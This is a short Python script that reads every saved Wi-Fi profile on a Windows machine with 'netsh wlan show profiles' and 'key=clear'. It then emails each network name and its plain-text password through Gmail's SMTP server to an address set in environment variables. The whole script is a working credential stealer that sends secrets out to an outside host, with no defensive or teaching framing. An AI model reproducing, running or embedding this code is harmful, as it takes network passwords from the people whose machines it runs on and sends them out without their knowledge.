import subprocess
import os
import smtplib
from email.message import EmailMessage

EMAIL_ADDRESS = os.environ.get('EMAIL_USER')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS')

msg = EmailMessage()
msg['Subject'] = 'WifiPasswords'
msg['From'] = EMAIL_ADDRESS
msg['To'] = EMAIL_ADDRESS

data = subprocess.check_output(
    ['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')

wifis = [line.split(':')[1][1:-1]
         for line in data if 'All User Profile' in line]


with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

    for wifi in wifis:
        results = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split('\n')
        results = [line.split(':')[1][1:-1]
                   for line in results if "Key Content" in line]
        try:
            msg.set_content(f'Name: {wifi}, Password: {results[0]}')
            smtp.send_message(msg)

        except:
            msg.set_content(f'Name: {wifi}, Password: Cannot be read!')
            smtp.send_message(msg)
